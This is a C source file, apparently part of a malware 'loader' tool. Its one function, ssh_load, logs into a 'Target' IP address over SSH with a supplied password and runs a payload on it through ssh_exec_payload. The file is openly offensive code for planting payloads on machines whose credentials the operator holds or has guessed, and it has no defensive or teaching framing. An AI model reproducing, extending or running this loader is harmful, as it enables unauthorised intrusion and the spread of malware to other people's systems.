#include "../../includes/ssh/connect.h"


/*
    *    util/loader/util/ssh/connect.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


void ssh_load(char *ipaddr, char *password, char *payload) {
    printf("\e[0;32mTarget: %s", ipaddr);
    
    int connection;
    ssh_session session;
    
    session = ssh_new();
    ssh_options_set(session, SSH_OPTIONS_HOST, ipaddr);    
    
    connection = ssh_connect(session);
    connection = ssh_userauth_password(session, NULL, password);
    
    ssh_exec_payload(ipaddr, payload, session);
    ssh_disconnect(session);
    ssh_free(session);
}